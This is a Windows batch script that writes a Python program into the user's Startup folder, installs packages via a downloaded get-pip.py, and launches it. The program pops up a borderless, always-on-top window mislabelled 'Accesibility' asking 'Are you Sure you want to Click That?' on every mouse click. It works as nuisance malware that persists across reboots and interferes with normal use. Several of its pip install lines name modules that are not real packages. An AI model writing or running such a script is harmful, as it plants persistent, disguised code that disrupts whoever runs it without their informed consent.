@echo off

cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

echo from tkinter.constants import BUTT, FALSE > program.pyw
echo from typing import Text >> program.pyw
echo import mouse >> program.pyw
echo import tkinter >> program.pyw
echo import threading >> program.pyw
echo def open_window(): >> program.pyw
echo     root = tkinter.Tk() >> program.pyw
echo     root.title("Accesibility") >> program.pyw
echo     root.resizable(FALSE, FALSE) >> program.pyw
echo     text = tkinter.Label(root, text="Are you Sure you want to Click That?") >> program.pyw
echo     button = tkinter.Button(root, text="ok", command=lambda : root.destroy()) >> program.pyw
echo     text.grid(padx=(10, 10), pady=(10, 0)) >> program.pyw
echo     button.grid(row=1, pady=(10, 5)) >> program.pyw
echo     mouse_pos = mouse.get_position() >> program.pyw
echo     root.geometry("+" + str(mouse_pos[0] - 115) + "+" + str(mouse_pos[1] - 60)) >> program.pyw
echo     root.bind('<Return>', lambda event : root.destroy()) >> program.pyw
echo     root.attributes("-topmost", True) >> program.pyw
echo     root.overrideredirect(True) >> program.pyw
echo     root.mainloop() >> program.pyw
echo def open_new_window(): >> program.pyw
echo     threading.Thread(target=open_window).start() >> program.pyw
echo def main(): >> program.pyw
echo     button_state = False >> program.pyw
echo     while (True): >> program.pyw
echo         if (mouse.is_pressed()): >> program.pyw
echo             if button_state == False: >> program.pyw
echo                 open_new_window() >> program.pyw
echo                 button_state = True >> program.pyw
echo         else: >> program.pyw
echo             button_state = False >> program.pyw
echo main() >> program.pyw 


cd C:\Users\%username%\AppData\Local\Programs\Python\Python39\lib\site-packages\pip

curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
python get-pip.py
set pip=C:\Users\%username%\AppData\Local\Programs\Python\Python39\lib\site-packages\pip

pip install python
pip install tkinter
pip install mouse
pip install threading

cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
start program.pyw
